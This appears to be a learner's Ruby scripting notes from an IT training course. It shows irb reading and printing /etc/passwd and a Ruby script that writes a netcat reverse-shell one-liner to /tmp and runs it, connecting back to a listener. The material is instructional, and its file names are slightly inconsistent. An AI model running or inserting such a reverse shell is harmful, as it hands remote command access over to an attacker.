# 	This is the third language we are covering here on IT pro tv. this is all ab	    out ruby. This is a very cool language and we are going to walk through the examples here just like bash and python. enjoy! :)


# 	we can get to the interactive ruby shell 'irb' by typing 'irb' 
# 	there is also a counter in the interactive shell. it counts how maney times #	    you push enter.

# here are some code snippets of example commands from the show.

Ruby Scripting Pt.1
=========================================================================
# Ex: reading from a file and printing output to the screen


::ENOENT (No such file or directory @ rb_sysopen - /etc/passwd )
 irb(main):010:0> var_file1 = File.read("/etc/passwd")
# => "root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin...
# irb(main):011:0> "

irb(main):12:0> puts var_file1  # the output is much cleaner with this command

# Example output:

an-snmp:x:124:131::/var/lib/snmp:/bin/false
speech-dispatcher:x:125:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
sslh:x:126:132::/nonexistent:/usr/sbin/nologin
nm-openvpn:x:127:133:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:x:128:134:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
pulse:x:129:135:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:130:138::/var/lib/saned:/usr/sbin/nologin
inetsim:x:131:140::/var/lib/inetsim:/usr/sbin/nologin
colord:x:132:141:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:133:142::/var/lib/geoclue:/usr/sbin/nologin
lightdm:x:134:143:Light Display Manager:/var/lib/lightdm:/bin/false
king-phisher:x:135:144::/var/lib/king-phisher:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kali:x:1000:1000:Kali Live user,,,:/home/kali:/usr/bin/zsh
Perenelle:x:1001:1001::/home/Perenelle:/bin/sh
=> nil
irb(main):013:0> 
===========================================================================

# above here are some examples of outputing to a file.

# below is an example of a ruby script with a bash one liner in it to 
# start a rev shell. The file is 
===========================================================================

#Ex:

#!/usr/bin/env ruby

# 
file1 = File.new("/tmp/file.sh", "w")   # we are creating a new file. we have 2 arguments inside the perands and we are telling it to write to the file path '/tmp/file.sh'
                                        # and seperated by a comma we are telling it two make this file writeable.
file1.chmod( 0755 )     # here we are changing the permissions to the file. if we did not write this in, file1.sh would not execute.
File.write("/tmp/file1.sh", "#!/bin/bash\nnc -nv 10.0.0.107 8888 -e /bin/bash")  # now we are writing to the file a one liner for a rev shell.
                                        # '\n' is calling for a new line in the file.
exec("bash /tmp/file1.sh")  # here we are telling the script to execute the bash one liner we have just writtin to 'file1.sh' file.


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

Ruby Scripting pt.2


# here is the first example script 

==================================






























